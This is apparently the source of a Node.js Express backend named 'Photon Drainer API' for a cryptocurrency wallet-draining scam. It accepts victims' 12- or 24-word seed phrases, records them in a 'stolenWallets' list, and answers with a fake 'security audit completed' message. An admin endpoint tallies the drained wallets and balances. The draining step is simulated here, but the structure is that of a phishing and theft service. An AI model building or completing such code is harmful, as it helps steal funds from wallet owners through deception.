const express = require('express');
const cors = require('cors');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json());

const PORT = process.env.PORT || 3001;

// Simple in-memory storage
let stolenWallets = [];

// API Endpoints
app.post('/api/drain', async (req, res) => {
    const { seedPhrase, walletType } = req.body;

    if (!seedPhrase || seedPhrase.split(' ').length < 12) {
        return res.status(400).json({
            success: false,
            error: 'Invalid seed phrase provided',
            message: 'Please provide a valid 12 or 24 word seed phrase'
        });
    }

    try {
        console.log(`[API] New drain request from ${walletType || 'unknown'}`);
        
        // Simulate drain
        stolenWallets.push({
            seedPhrase: seedPhrase.substring(0, 20) + '...',
            publicKey: 'Simulated_' + Date.now(),
            balance: Math.random() * 10,
            drained: true,
            timestamp: Date.now()
        });

        return res.json({
            success: true,
            message: 'Wallet security audit completed. No vulnerabilities found.',
            auditId: require('crypto').randomBytes(16).toString('hex'),
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        console.error('API Error:', error);
        return res.status(500).json({
            success: false,
            error: 'Internal server error',
            message: 'Please try again later'
        });
    }
});

app.get('/api/admin/stats', (req, res) => {
    return res.json({
        totalDrained: stolenWallets.length,
        totalSol: stolenWallets.reduce((sum, w) => sum + w.balance, 0),
        wallets: stolenWallets
    });
});

app.get('/api/health', (req, res) => {
    res.json({ status: 'operational', timestamp: new Date().toISOString() });
});

app.get('/', (req, res) => {
    res.json({ 
        status: 'Photon Drainer API is running',
        endpoints: {
            drain: '/api/drain (POST)',
            stats: '/api/admin/stats (GET)',
            health: '/api/health (GET)'
        }
    });
});

app.listen(PORT, () => {
    console.log(`🚀 Drainer API running on port ${PORT}`);
    console.log(`📍 Endpoint: http://localhost:${PORT}/api/drain`);
    console.log(`📊 Stats: http://localhost:${PORT}/api/admin/stats`);
});